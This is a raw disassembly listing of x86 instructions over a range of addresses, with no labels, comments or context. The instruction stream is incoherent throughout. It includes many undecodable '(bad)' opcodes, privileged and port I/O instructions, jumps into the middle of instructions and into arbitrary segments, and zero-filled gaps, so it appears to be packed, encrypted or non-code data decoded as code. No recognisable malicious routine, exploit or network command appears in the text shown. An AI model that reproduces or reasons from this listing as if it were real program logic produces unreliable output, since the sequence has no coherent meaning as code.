  42b4dc:	pop    eax
  42b4dd:	imul   edi,DWORD PTR [edx+0x4],0xffffffb7
  42b4e1:	xor    esi,DWORD PTR [ecx+0x49f6ed42]
  42b4e7:	into   
  42b4e8:	add    ebp,esp
  42b4ea:	mov    bl,0x80
  42b4ec:	fld    QWORD PTR [edx]
  42b4ee:	or     al,0x10
  42b4f0:	push   esp
  42b4f1:	jecxz  0x42b4e2
  42b4f3:	cli    
  42b4f4:	mov    dh,0x6f
  42b4f6:	cmp    eax,0x157663bc
  42b4fb:	fwait
  42b4fc:	mov    al,ds:0x16fa0f9e
  42b501:	or     DWORD PTR [ecx-0x43615d91],esi
  42b507:	fidivr WORD PTR [esi-0x66ef6cd5]
  42b50d:	add    BYTE PTR [eax+0x59],bl
  42b510:	mov    DWORD PTR [ecx-0x53b88818],esi
  42b516:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42b517:	pop    esp
  42b518:	add    DWORD PTR [edi-0x69ce2a03],0xfffffffe
  42b51f:	les    eax,FWORD PTR [edx-0x26]
  42b522:	(bad)  
  42b523:	adc    dh,cl
  42b525:	sub    bl,BYTE PTR [edx+0x78c2693b]
  42b52b:	in     al,dx
  42b52c:	push   edi
  42b52d:	adc    al,BYTE PTR [ebp+0x6b832d7b]
  42b533:	push   ds
  42b534:	dec    ebx
  42b535:	mov    bh,0xe2
  42b537:	cli    
  42b538:	sub    eax,0x2367b5b5
  42b53d:	les    edx,FWORD PTR [ebx]
  42b53f:	retf   0x738c
  42b542:	daa    
  42b543:	cmp    DWORD PTR ds:0x699e7131,edx
  42b549:	push   ebx
  42b54a:	inc    ebp
  42b54b:	js     0x42b5c5
  42b54d:	es test eax,0x2de7f50c
  42b553:	fisubr DWORD PTR [esi-0xe]
  42b556:	repnz aam 0xf
  42b559:	outs   dx,BYTE PTR ds:[esi]
  42b55a:	inc    ecx
  42b55b:	(bad)  
  42b55c:	dec    edx
  42b55d:	mov    dh,0x64
  42b55f:	addr16 dec ecx
  42b561:	xor    DWORD PTR [ebp+0x1d55984b],ebx
  42b567:	dec    ebp
  42b568:	popf   
  42b569:	test   BYTE PTR [ecx+0x4ac9dbc4],dh
  42b56f:	hlt    
  42b570:	(bad)  
  42b571:	sbb    ch,dl
  42b573:	pop    ecx
  42b574:	jecxz  0x42b4f9
  42b576:	(bad)  
  42b577:	mov    ebx,0xea1bc3d8
  42b57c:	je     0x42b58f
  42b57e:	jp     0x42b52b
  42b580:	ret    
  42b581:	sti    
  42b582:	js     0x42b548
  42b584:	(bad)  
  42b585:	bnd je 0x42b539
  42b588:	jle    0x42b510
  42b58a:	dec    eax
  42b58b:	fst    DWORD PTR [esi]
  42b58d:	cmp    bl,ah
  42b58f:	test   DWORD PTR [esi],0x0
	...
  42b5f1:	add    BYTE PTR [eax],al
  42b5f3:	add    al,ah
  42b5f5:	xchg   esp,eax
  42b5f6:	and    bh,cl
  42b5f8:	je     0x42b5f9
  42b5fa:	out    dx,eax
  42b5fb:	mov    edi,0x1397875f
  42b600:	cmc    
  42b601:	pusha  
  42b602:	ror    DWORD PTR [eax],cl
  42b604:	mov    esi,0x50001d0
  42b609:	add    DWORD PTR [eax],eax
  42b60b:	add    BYTE PTR [ebx-0x26f5bdce],ah
  42b611:	xchg   BYTE PTR [esi-0x47],ch
  42b614:	or     DWORD PTR [ebx],esp
  42b616:	xchg   ecx,eax
  42b617:	out    dx,al
  42b618:	jae    0x42b686
  42b61a:	mov    ds:0x5a9bed0c,al
  42b61f:	jae    0x42b5b8
  42b621:	out    0xd2,al
  42b623:	repz out 0xd8,eax
  42b626:	inc    esi
  42b627:	fisub  DWORD PTR [eax+ebx*8]
  42b62a:	sbb    bl,BYTE PTR [eax-0x5d65a114]
  42b630:	test   eax,0x31224553
  42b635:	sub    BYTE PTR cs:[ecx-0x5a],ch
  42b639:	inc    edx
  42b63a:	pop    edi
  42b63b:	int3   
  42b63c:	mov    ds:0xf8c57f90,eax
  42b641:	or     al,al
  42b643:	aas    
  42b644:	xchg   si,ax
  42b646:	cdq    
  42b647:	call   0x6ef809f4
  42b64c:	sub    al,0x6e
  42b64e:	into   
  42b64f:	retf   0x306a
  42b652:	pushf  
  42b653:	xchg   ebx,eax
  42b654:	jge    0x42b670
  42b656:	(bad)  
  42b657:	int    0x63
  42b659:	cs dec edi
  42b65b:	imul   ebx,ebp,0x1cde7745
  42b661:	pop    ecx
  42b662:	into   
  42b663:	xor    ebp,edx
  42b665:	push   eax
  42b666:	(bad)  
  42b667:	push   cs
  42b668:	call   0x1c4a:0xf9a13127
  42b66f:	xchg   edx,eax
  42b670:	xchg   edi,ebp
  42b672:	loopne 0x42b61e
  42b674:	mov    eax,0x72496bd0
  42b679:	and    BYTE PTR [ecx],al
  42b67b:	pop    bp
  42b67d:	pop    edx
  42b67e:	mov    eax,0x8388d45f
  42b683:	cdq    
  42b684:	push   ss
  42b685:	repz cwde 
  42b687:	aam    0x99
  42b689:	out    0x23,eax
  42b68b:	bnd call 0xa36edab
  42b691:	and    esi,DWORD PTR [eax]
  42b693:	(bad)  
  42b694:	not    BYTE PTR [esi-0x589bb24b]
  42b69a:	push   cs
  42b69b:	test   al,dl
  42b69d:	(bad)  
  42b69e:	jl     0x42b71d
  42b6a0:	pop    esi
  42b6a1:	and    DWORD PTR [edi],ebx
  42b6a3:	bound  ebp,QWORD PTR [eax-0x4fa39e8f]
  42b6a9:	(bad)  
  42b6aa:	jle    0x42b691
  42b6ac:	stos   DWORD PTR es:[edi],eax
  42b6ad:	xor    DWORD PTR [edx+0x4e],ebx
  42b6b0:	(bad)  
  42b6b1:	cmc    
  42b6b2:	out    dx,al
  42b6b3:	mov    cs,WORD PTR [eax-0x4a9c76c3]
  42b6b9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42b6ba:	test   ah,bl
  42b6bc:	jae    0x42b656
  42b6be:	ja     0x42b6c8
  42b6c0:	or     eax,0xed49d6b5
  42b6c5:	mov    bl,BYTE PTR [ecx]
  42b6c7:	outs   dx,DWORD PTR ds:[esi]
  42b6c8:	push   edx
  42b6c9:	adc    al,0x8
  42b6cb:	test   DWORD PTR ds:0xf4bcfe0b,edi
  42b6d1:	xor    eax,0x1834c562
  42b6d7:	idiv   bh
  42b6d9:	inc    ebx
  42b6da:	jmp    0x42b678
  42b6dc:	clc    
  42b6dd:	mov    bh,0x52
  42b6df:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42b6e0:	and    bp,WORD PTR [eax-0x7e]
  42b6e4:	push   ecx
  42b6e5:	push   edx
  42b6e6:	mov    dh,0x23
  42b6e8:	out    dx,eax
  42b6e9:	enter  0x231a,0xea
  42b6ed:	js     0x42b713
  42b6ef:	scas   eax,DWORD PTR es:[edi]
  42b6f0:	repnz and eax,0x36825fd8
  42b6f6:	jbe    0x42b6aa
  42b6f8:	cwde   
  42b6f9:	or     bl,ah
  42b6fb:	fwait
  42b6fc:	xchg   esi,eax
  42b6fd:	xchg   BYTE PTR [ebp-0x157225],dh
  42b703:	or     dh,BYTE PTR [ecx+0x3e]
  42b706:	sbb    cl,BYTE PTR [eax]
  42b708:	xor    al,0xd1
  42b70a:	fiadd  DWORD PTR [ebp-0x4c4f416f]
  42b710:	imul   eax,DWORD PTR [eax],0x0
	...
  42b772:	add    BYTE PTR [eax],al
  42b774:	dec    esi
  42b775:	inc    edx
  42b776:	dec    ecx
  42b777:	daa    
  42b778:	dec    ebp
  42b779:	das    
  42b77a:	outs   dx,BYTE PTR ds:[esi]
  42b77b:	imul   edx,edx,0x63
  42b77e:	push   ecx
  42b77f:	xchg   edx,eax
  42b780:	jl     0x42b7dd
  42b782:	jae    0x42b7e3
  42b784:	ret    
  42b785:	rol    DWORD PTR [ecx],1
  42b787:	add    BYTE PTR ds:0xc6000001,al
  42b78d:	dec    edx
  42b78e:	out    dx,eax
  42b78f:	enter  0xf3e8,0x55
  42b793:	push   ebx
  42b794:	aaa    
  42b795:	sub    eax,0x8c85eb40
  42b79a:	shl    ch,cl
  42b79c:	lea    eax,[ebp+esi*1+0x15]
  42b7a0:	outs   dx,DWORD PTR ds:[esi]
  42b7a1:	mov    ds,WORD PTR [ebx]
  42b7a3:	in     al,0xe9
  42b7a5:	popf   
  42b7a6:	cdq    
  42b7a7:	call   0xc869:0x3550b5e
  42b7ae:	mov    ebx,0xecd18306
  42b7b3:	jle    0x42b79f
  42b7b5:	mov    al,ds:0x1622e64
  42b7ba:	dec    edx
  42b7bb:	lahf   
  42b7bc:	ja     0x42b7a3
  42b7be:	lea    ebx,[edi]
  42b7c0:	lea    edi,ds:0x3320b2f6
  42b7c6:	call   0xc754ef8e
  42b7cb:	es push esi
  42b7cd:	add    eax,DWORD PTR [ebx+edi*1+0x58]
  42b7d1:	rcl    BYTE PTR [ecx+0x27],0xd5
  42b7d5:	mov    BYTE PTR [ebx],cl
  42b7d7:	lea    ebp,[edi-0x2bf0323e]
  42b7dd:	test   eax,0x8053a00b
  42b7e2:	cmp    bl,BYTE PTR [ebx-0xd37249e]
  42b7e8:	push   0x1c
  42b7ea:	out    dx,eax
  42b7eb:	sbb    esi,DWORD PTR [ebp-0x65]
  42b7ee:	jb     0x42b854
  42b7f0:	adc    eax,0x1140ad05
  42b7f5:	xor    edx,edx
  42b7f7:	cmp    WORD PTR ds:0xde0a2757,bp
  42b7fe:	adc    al,0x6
  42b800:	add    al,0xd3
  42b802:	fsub   QWORD PTR [esi+0x65]
  42b805:	sub    edi,eax
  42b807:	and    DWORD PTR [edx-0x61],edx
  42b80a:	jg     0x42b818
  42b80c:	jle    0x42b798
  42b80e:	mov    ds:0xd12727fd,eax
  42b813:	sbb    BYTE PTR [esp+edx*1-0x3ac184c6],0xe0
  42b81b:	loopne 0x42b7d5
  42b81d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42b81e:	retf   0x230f
  42b821:	ss dec ebp
  42b823:	test   DWORD PTR [ebp+ebp*4-0x327cc000],esp
  42b82a:	xchg   ebp,eax
  42b82b:	cmp    DWORD PTR [edi+ecx*8],0x86ac4df4
  42b832:	adc    DWORD PTR [edi-0x3d0ebde7],0x2d
  42b839:	jns    0x42b83d
  42b83b:	jns    0x42b8b7
  42b83d:	pop    ss
  42b83e:	inc    esi
  42b83f:	jl     0x42b8b6
  42b841:	sub    BYTE PTR [esi],ah
  42b843:	jns    0x42b8b0
  42b845:	popa   
  42b846:	or     esp,DWORD PTR [ebx+0x21eb6088]
  42b84c:	lds    edx,FWORD PTR [ecx+0x3fa15d64]
  42b852:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42b853:	popa   
  42b854:	adc    ebp,0xe1be9915
  42b85a:	fs fs ds in al,0x2c
  42b85f:	xor    al,0xf1
  42b861:	fnsave [ecx-0x45]
  42b864:	mov    edi,0x5303005e
  42b869:	ja     0x42b88b
  42b86b:	jmp    0xbba4:0x73b7233e
  42b872:	push   edi
  42b873:	xor    al,0xb7
  42b875:	or     ebx,DWORD PTR [esi]
  42b877:	push   ebp
  42b878:	add    BYTE PTR [ebp-0x618359a1],bh
  42b87e:	mov    al,ds:0x694fc53b
  42b883:	sbb    eax,0xb267e8f7
  42b888:	mov    esp,0xf1e7493b
  42b88d:	or     ch,BYTE PTR [eax+0xcb8f]
	...
  42b8f3:	add    al,ch
  42b8f5:	popf   
  42b8f6:	mov    esi,0xf9e7ffe7
  42b8fb:	lahf   
  42b8fc:	ret    0x608c
  42b8ff:	or     ebp,DWORD PTR [eax-0x37f24137]
  42b905:	rol    BYTE PTR [ecx],cl
  42b907:	add    BYTE PTR ds:0xeb000001,al
  42b90d:	inc    edi
  42b90e:	pop    esi
  42b90f:	push   cs
  42b910:	(bad)  
  42b911:	ds hlt 
  42b913:	and    al,0x6a
  42b915:	fdiv   QWORD PTR [edx]
  42b917:	inc    ecx
  42b918:	mov    es,WORD PTR [edx-0x7d]
  42b91b:	les    ebp,FWORD PTR [ecx]
  42b91d:	pop    es
  42b91e:	and    edx,DWORD PTR [eax+eiz*8+0x5fa5676b]
  42b925:	or     ebx,DWORD PTR [ecx-0x9]
  42b928:	int3   
  42b929:	xor    eax,0x1e9d3b86
  42b92e:	sbb    edx,DWORD PTR gs:[esi]
  42b931:	fs dec eax
  42b933:	test   al,0x43
  42b935:	cmp    BYTE PTR [edx],0x50
  42b938:	or     DWORD PTR [edi+0x29],eax
  42b93b:	jno    0x42b921
  42b93d:	shr    BYTE PTR ds:0x2ed275ad,1
  42b943:	adc    cl,BYTE PTR [edx+0x5a]
  42b946:	jl     0x42b8ed
  42b948:	pusha  
  42b949:	add    al,0xd1
  42b94b:	xlat   BYTE PTR ds:[ebx]
  42b94c:	cmc    
  42b94d:	mov    ds:0x836f24a7,al
  42b952:	xor    ah,al
  42b954:	inc    edi
  42b955:	jnp    0x42b97b
  42b957:	pop    eax
  42b958:	dec    ebx
  42b959:	test   DWORD PTR [ebx],edi
  42b95b:	push   esi
  42b95c:	mov    esp,0xb8c06dcb
  42b961:	jne    0x42b9bc
  42b963:	xor    ebx,DWORD PTR [ebx+0x62615eb5]
  42b969:	jb     0x42b962
  42b96b:	push   ecx
  42b96c:	pop    esi
  42b96d:	cwde   
  42b96e:	pop    ds
  42b96f:	mov    bh,BYTE PTR [ebx-0x4d]
  42b972:	(bad)  
  42b973:	mov    ss,ebx
  42b975:	les    edx,FWORD PTR [ebx+0x3a]
  42b978:	jl     0x42b975
  42b97a:	push   ebx
  42b97b:	scas   al,BYTE PTR es:[edi]
  42b97c:	mov    ah,0x6f
  42b97e:	add    cl,BYTE PTR [ebp+0x27e4bd1d]
  42b984:	mov    esp,ecx
  42b986:	pop    ecx
  42b987:	fnstenv [ebp-0x53a0a115]
  42b98d:	and    edx,DWORD PTR [ebx-0x7f2af64]
  42b993:	cmp    DWORD PTR [edi+0x9],ebp
  42b996:	ret    0xbd8d
  42b999:	mov    ds:0x2a91247e,al
  42b99e:	int    0x5c
  42b9a0:	mov    ebx,0x3211e135
  42b9a5:	lods   al,BYTE PTR ds:[esi]
  42b9a6:	mov    WORD PTR [ebp-0x4113ef07],ds
  42b9ac:	xchg   BYTE PTR [ebx-0x36],al
  42b9af:	inc    ebx
  42b9b0:	xchg   esp,eax
  42b9b1:	in     al,0xca
  42b9b3:	jge    0x42b93e
  42b9b5:	popa   
  42b9b6:	sbb    al,0x95
  42b9b8:	pop    eax
  42b9b9:	lahf   
  42b9ba:	icebp  
  42b9bb:	or     cl,BYTE PTR [edx]
  42b9bd:	push   ss
  42b9be:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42b9bf:	and    BYTE PTR [ebx+edx*4-0x76],0x67
  42b9c4:	push   0x27
  42b9c6:	retf   0x67c6
  42b9c9:	mov    ds:0x129cac45,al
  42b9ce:	xchg   edx,eax
  42b9cf:	mov    cl,0xe9
  42b9d1:	clc    
  42b9d2:	jne    0x42b955
  42b9d4:	ins    DWORD PTR es:[edi],dx
  42b9d5:	add    eax,DWORD PTR [edi-0x30]
  42b9d8:	add    ebp,esp
  42b9da:	mov    ds:0xb72c1ae,al
  42b9df:	out    0x6f,eax
  42b9e1:	out    0xad,eax
  42b9e3:	stos   BYTE PTR es:[edi],al
  42b9e4:	add    DWORD PTR [edx-0x28cd4080],eax
  42b9ea:	into   
  42b9eb:	sti    
  42b9ec:	dec    eax
  42b9ed:	cdq    
  42b9ee:	jp     0x42b9f9
  42b9f0:	pop    esi
  42b9f1:	bound  esi,QWORD PTR [ebp-0x6996d86e]
  42b9f7:	push   0xf7cd5e4c
  42b9fc:	inc    eax
  42b9fd:	push   ds
  42b9fe:	mov    dh,0xc7
  42ba00:	loop   0x42b9fc
  42ba02:	xchg   esp,eax
  42ba03:	mov    edx,0x23b28739
  42ba08:	cdq    
  42ba09:	scas   al,BYTE PTR es:[edi]
  42ba0a:	jmp    0x42b9bb
  42ba0c:	in     al,0xe6
  42ba0e:	or     al,0x6a
  42ba10:	das    
	...
  42ba71:	add    BYTE PTR [eax],al
  42ba73:	add    BYTE PTR [ebx-0x431d4ff9],cl
  42ba79:	neg    ebx
  42ba7b:	outs   dx,DWORD PTR ds:[esi]
  42ba7c:	push   0x5b
  42ba7e:	xchg   ecx,eax
  42ba7f:	or     DWORD PTR [ebp-0x326da0fe],eax
  42ba85:	rol    DWORD PTR [ecx],cl
  42ba87:	add    BYTE PTR ds:0x4c000001,al
  42ba8d:	pop    es
  42ba8e:	sub    edi,ecx
  42ba90:	ret    
  42ba91:	fdiv   DWORD PTR [edx]
  42ba93:	loop   0x42ba5b
  42ba95:	add    al,0x50
  42ba97:	pop    edx
  42ba98:	pop    ds
  42ba99:	das    
  42ba9a:	sub    BYTE PTR [eax+0x4c],cl
  42ba9d:	dec    eax
  42ba9e:	add    al,0xd9
  42baa0:	add    DWORD PTR [esi-0x70],edi
  42baa3:	sbb    eax,ebx
  42baa5:	cmp    DWORD PTR [edi-0x7e],esp
  42baa8:	pushf  
  42baa9:	push   es
  42baaa:	adc    al,0x43
  42baac:	js     0x42bafc
  42baae:	xor    al,0x4
  42bab0:	ja     0x42bac9
  42bab2:	or     DWORD PTR [edx-0x1987812d],esp
  42bab8:	add    DWORD PTR [ebx],edi
  42baba:	aam    0x3e
  42babc:	out    0x60,eax
  42babe:	outs   dx,DWORD PTR ds:[esi]
  42babf:	and    al,0x9b
  42bac1:	mov    eax,ds:0x1cf3d3c1
  42bac6:	js     0x42baee
  42bac8:	das    
  42bac9:	shl    BYTE PTR [edi-0x2c1a4c80],1
  42bacf:	mov    ch,0xec
  42bad1:	add    BYTE PTR [ecx-0x2b],bh
  42bad4:	not    DWORD PTR [eax+0x37dae1e]
  42bada:	mov    bh,BYTE PTR [edx+0x7f]
  42badd:	mov    ah,0x3e
  42badf:	inc    ecx
  42bae0:	in     eax,0x61
  42bae2:	and    bh,BYTE PTR [ebx+0x7ddec33]
  42bae8:	lea    esp,[eax-0x3e]
  42baeb:	js     0x42baef
  42baed:	(bad)  
  42baef:	mov    eax,0xc1c8f701
  42baf4:	inc    esp
  42baf5:	dec    esi
  42baf6:	or     edx,DWORD PTR [edx-0x602fa384]
  42bafc:	sbb    DWORD PTR [esi],esp
  42bafe:	mov    al,0x7
  42bb00:	mov    esi,0xf01c5df9
  42bb05:	loop   0x42baaf
  42bb07:	loopne 0x42bb3d
  42bb09:	inc    esi
  42bb0a:	xor    cl,BYTE PTR [edi+0x3799f5b3]
  42bb10:	leave  
  42bb11:	imul   esi,DWORD PTR ds:0xe741d203,0xe
  42bb18:	ss pop eax
  42bb1a:	sub    al,0xaf
  42bb1c:	cwde   
  42bb1d:	arpl   bx,sp
  42bb1f:	cmp    BYTE PTR [edx+0x2273f60],0x70
  42bb26:	mov    bh,0x14
  42bb28:	lahf   
  42bb29:	stos   BYTE PTR es:[edi],al
  42bb2a:	popf   
  42bb2b:	mov    al,0x2c
  42bb2d:	push   0xffffffd0
  42bb2f:	mov    dh,0x94
  42bb31:	adc    al,0xc
  42bb33:	sub    eax,0x9e0a3157
  42bb38:	neg    BYTE PTR [edx-0x77754064]
  42bb3e:	retf   
  42bb3f:	fwait
  42bb40:	xchg   edi,edx
  42bb42:	push   0xffffffc0
  42bb44:	ja     0x42bb31
  42bb46:	push   ds
  42bb47:	dec    eax
  42bb48:	addr16 xchg esp,eax
  42bb4a:	test   al,0x11
  42bb4c:	add    eax,esi
  42bb4e:	rcl    BYTE PTR [eax],1
  42bb50:	adc    BYTE PTR [esi],ah
  42bb52:	rcl    BYTE PTR [ebx-0x7e],cl
  42bb55:	aaa    
  42bb56:	(bad)  
  42bb57:	fild   DWORD PTR [eax]
  42bb59:	retf   
  42bb5a:	xchg   BYTE PTR [eax+edx*2],bh
  42bb5d:	xchg   edx,eax
  42bb5e:	pop    esp
  42bb5f:	test   DWORD PTR [ebx+eiz*1],0xb13e47f1
  42bb66:	and    BYTE PTR [eax-0x66dd05c0],bl
  42bb6c:	pop    ebx
  42bb6d:	sbb    cl,dh
  42bb6f:	cmc    
  42bb70:	sub    esp,DWORD PTR [edx+0x78fa5c96]
  42bb76:	sub    bl,ah
  42bb78:	das    
  42bb79:	ret    0xe3d3
  42bb7c:	inc    ecx
  42bb7d:	and    ch,al
  42bb7f:	lods   eax,DWORD PTR ds:[esi]
  42bb80:	lods   al,BYTE PTR ds:[esi]
  42bb81:	imul   esp,DWORD PTR [ecx+ecx*8+0x125ae259],0xffffff91
  42bb89:	add    eax,0x453d6bd1
  42bb8e:	mov    al,ds:0x6af4
	...
  42bbf3:	add    BYTE PTR [eax+ebp*1],dh
  42bbf6:	add    DWORD PTR [esi],eax
  42bbf8:	sbb    eax,0x233a372f
  42bbfd:	sub    DWORD PTR [ebx],eax
  42bbff:	dec    ecx
  42bc00:	adc    bh,bh
  42bc02:	add    edx,ecx
  42bc04:	rcl    ah,cl
  42bc06:	add    DWORD PTR [eax],eax
  42bc08:	add    eax,0xf7000001
  42bc0d:	jmp    0x42bc54
  42bc0f:	xor    eax,DWORD PTR [eax-0x6967693]
  42bc15:	int3   
  42bc16:	and    ebp,DWORD PTR [eax-0x117418f3]
  42bc1c:	or     edx,DWORD PTR [ecx+0x1]
  42bc1f:	outs   dx,BYTE PTR ds:[esi]
  42bc20:	dec    esp
  42bc21:	mov    ah,0x38
  42bc23:	push   esi
  42bc24:	mov    DWORD PTR [ecx-0x5a],ebx
  42bc27:	rcr    bh,cl
  42bc29:	or     BYTE PTR [esi+ecx*8],ch
  42bc2c:	jne    0x42bc8a
  42bc2e:	mov    eax,ds:0xe3627bbc
  42bc33:	dec    ecx
  42bc34:	mov    ebp,0xabce9a6f
  42bc39:	push   ebx
  42bc3a:	ins    BYTE PTR es:[edi],dx
  42bc3b:	out    0x91,al
  42bc3d:	mov    ebx,DWORD PTR [esi+esi*8+0x5a]
  42bc41:	and    eax,ebp
  42bc43:	bound  esi,QWORD PTR cs:[esi-0x36e17f7]
  42bc4a:	repz ds fwait
  42bc4d:	ins    DWORD PTR es:[edi],dx
  42bc4e:	(bad)  
  42bc4f:	mov    fs,WORD PTR [ecx+esi*8]
  42bc52:	pop    ebx
  42bc53:	gs cmp al,0x64
  42bc56:	xor    bl,BYTE PTR [esi]
  42bc58:	out    dx,eax
  42bc59:	inc    ebp
  42bc5a:	or     BYTE PTR [edx],dl
  42bc5c:	shr    BYTE PTR [eax+0xb],cl
  42bc5f:	pop    ds
  42bc60:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42bc61:	(bad)  
  42bc62:	sbb    eax,DWORD PTR [edi]
  42bc64:	xchg   ecx,eax
  42bc65:	jge    0x42bcbe
  42bc67:	imul   ebp,edi,0x7cdc6f72
  42bc6d:	sub    eax,0xdec34cd6
  42bc72:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42bc73:	xor    eax,DWORD PTR [ebp+0xfeb53f0]
  42bc79:	cmp    esi,0xb2571273
  42bc7f:	(bad)  
  42bc80:	jmp    0x42bcbc
  42bc82:	shr    DWORD PTR [ebp-0x51],1
  42bc85:	push   ds
  42bc86:	push   cs
  42bc87:	mov    al,ds:0xf45540ca
  42bc8c:	push   0x70
  42bc8e:	mov    BYTE PTR [ebp-0x3c],0x0
  42bc92:	gs xor ebx,DWORD PTR cs:[eax-0x19]
  42bc97:	out    dx,eax
  42bc98:	jecxz  0x42bcd4
  42bc9a:	adc    DWORD PTR [edx+0x5f6ffc05],esp
  42bca0:	imul   esp,DWORD PTR [esi-0x49],0x990da3ec
  42bca7:	add    DWORD PTR [ecx+0x7f],edx
  42bcaa:	das    
  42bcab:	jg     0x42bc94
  42bcad:	jp     0x42bcec
  42bcaf:	repz inc ebp
  42bcb1:	pop    ebx
  42bcb2:	pop    edi
  42bcb3:	dec    esp
  42bcb4:	jg     0x42bcca
  42bcb6:	das    
  42bcb7:	cwde   
  42bcb8:	stc    
  42bcb9:	cmc    
  42bcba:	jmp    0xbbab1a37
  42bcbf:	xor    ebp,DWORD PTR ds:0x76cb8463
  42bcc5:	stc    
  42bcc6:	mov    esi,0x4b2c55a5
  42bccb:	mov    edx,0xca190503
  42bcd0:	inc    edi
  42bcd1:	(bad)  
  42bcd3:	aas    
  42bcd4:	and    edx,edi
  42bcd6:	aaa    
  42bcd7:	pop    ds
  42bcd8:	fwait
  42bcd9:	mov    eax,0x1a1e2dda
  42bcde:	in     al,0x80
  42bce0:	pop    es
  42bce1:	xchg   esi,eax
  42bce2:	sub    al,0xdc
  42bce4:	sbb    al,0x11
  42bce6:	mov    dh,0xef
  42bce8:	jno    0x42bd30
  42bcea:	div    BYTE PTR [edi+0x60]
  42bced:	xchg   ecx,esi
  42bcef:	inc    ebp
  42bcf0:	jb     0x42bd62
  42bcf2:	and    dl,0x9a
  42bcf5:	xchg   ebp,eax
  42bcf6:	(bad)  
  42bcf7:	into   
  42bcf8:	ficomp WORD PTR [esi]
  42bcfa:	and    al,0xdd
  42bcfc:	cs and eax,0x6e91b2d3
  42bd02:	nop
  42bd03:	pop    DWORD PTR [esi+eiz*8]
  42bd06:	mov    BYTE PTR [edi+0x57e4ee68],bl
  42bd0c:	push   esp
  42bd0d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42bd0e:	scas   eax,DWORD PTR es:[edi]
  42bd0f:	or     al,dl
	...
  42bd71:	add    BYTE PTR [eax],al
  42bd73:	add    BYTE PTR [eax-0x61eb634a],dh
  42bd79:	ds mov eax,0xffec3b6
  42bd7f:	jae    0x42bd4c
  42bd81:	inc    eax
  42bd82:	ret    0xd788
  42bd85:	aad    0x1
  42bd87:	add    BYTE PTR ds:0x9e000001,al
  42bd8d:	cmp    eax,0xf528dd02
  42bd92:	outs   dx,DWORD PTR ds:[esi]
  42bd93:	dec    ecx
  42bd94:	push   ebx
  42bd95:	cmp    dl,BYTE PTR [edi+0x5]
  42bd98:	call   0xe49c:0xa387ebd7
  42bd9f:	fiadd  WORD PTR [edx-0x739922f4]
  42bda5:	gs pop ebp
  42bda7:	sub    DWORD PTR [edi+0x3e],eax
  42bdaa:	adc    al,0x8d
  42bdac:	loop   0x42bd9f
  42bdae:	inc    ecx
  42bdaf:	sar    BYTE PTR [edx],0xfb
  42bdb2:	addr16 xor bh,cl
  42bdb5:	xchg   ecx,eax
  42bdb6:	adc    edx,edi
  42bdb8:	aas    
  42bdb9:	mov    esp,0x1ec441d9
  42bdbe:	mul    BYTE PTR [ecx+0x6a]
  42bdc1:	fxch   st(4)
  42bdc3:	sar    BYTE PTR [ecx+0x5e20eb81],0x53
  42bdca:	sahf   
  42bdcb:	adc    BYTE PTR [ecx-0xd],dh
  42bdce:	(bad)  
  42bdcf:	sub    ecx,ebp
  42bdd1:	ficom  DWORD PTR ds:0x16bdfd76
  42bdd7:	lods   al,BYTE PTR ds:[esi]
  42bdd8:	push   ebp
  42bdd9:	xchg   DWORD PTR [eax+esi*4-0x2c153516],ebx
  42bde0:	inc    ebp
  42bde1:	popa   
  42bde2:	pop    edi
  42bde3:	mov    ch,0xfa
  42bde5:	(bad)  
  42bde6:	cmp    ah,BYTE PTR [eax+ebp*2-0x7]
  42bdea:	or     BYTE PTR [eax],bh
  42bdec:	jle    0x42bde5
  42bdee:	into   
  42bdef:	ja     0x42be6e
  42bdf1:	jns    0x42bda5
  42bdf3:	inc    eax
  42bdf4:	xor    ah,dl
  42bdf6:	xchg   ebp,eax
  42bdf7:	ss dec esp
  42bdf9:	sbb    BYTE PTR [edx-0x73],ah
  42bdfc:	mov    ch,0xda
  42bdfe:	or     esi,0xffffff9d
  42be01:	xchg   ebx,eax
  42be02:	xchg   esp,eax
  42be03:	cmp    BYTE PTR [ecx+0x34],ah
  42be06:	mov    ebp,0x3dc82249
  42be0b:	dec    eax
  42be0c:	std    
  42be0d:	push   esi
  42be0e:	aaa    
  42be0f:	push   eax
  42be10:	sub    BYTE PTR [ebp+ebp*4-0x66],ch
  42be14:	scas   al,BYTE PTR es:[edi]
  42be15:	ins    BYTE PTR es:[edi],dx
  42be16:	enter  0x8207,0x79
  42be1a:	(bad)  
  42be1b:	mov    al,0x19
  42be1d:	retf   
  42be1e:	clc    
  42be1f:	cmp    eax,0xf67b1e3
  42be24:	retf   0x13c6
  42be27:	clc    
  42be28:	pushf  
  42be29:	hlt    
  42be2a:	js     0x42be8b
  42be2c:	mov    al,0x4d
  42be2e:	sbb    esi,DWORD PTR [eax]
  42be30:	xor    bh,BYTE PTR [edx-0x3b]
  42be33:	and    DWORD PTR [ebx],edx
  42be35:	push   cs
  42be36:	push   ds
  42be37:	or     bl,ah
  42be39:	sub    al,0xa0
  42be3b:	jne    0x42be3e
  42be3d:	jne    0x42be7d
  42be3f:	ret    
  42be40:	xchg   esi,eax
  42be41:	aad    0x9a
  42be43:	aaa    
  42be44:	rol    ch,1
  42be46:	push   es
  42be47:	xor    BYTE PTR [esi],0xd4
  42be4a:	jmp    0x6143fe20
  42be4f:	jmp    0x42be70
  42be51:	and    eax,0xc5a47f90
  42be56:	sub    DWORD PTR ds:0x9170fb1a,ebp
  42be5c:	popa   
  42be5d:	pop    ebx
  42be5e:	imul   edx,DWORD PTR [ecx+0x13dc636b],0x433b19eb
  42be68:	xor    al,ch
  42be6a:	test   edi,eax
  42be6c:	fimul  DWORD PTR [edi]
  42be6e:	icebp  
  42be6f:	outs   dx,BYTE PTR ds:[esi]
  42be70:	(bad)  
  42be71:	test   al,0x68
  42be73:	mov    cl,0x5f
  42be75:	or     cl,BYTE PTR [ebx-0x285b7622]
  42be7b:	mov    esi,0x341d46bb
  42be80:	or     dh,dh
  42be82:	pop    ds
  42be83:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42be84:	or     eax,0x1eae1f32
  42be89:	xchg   esp,eax
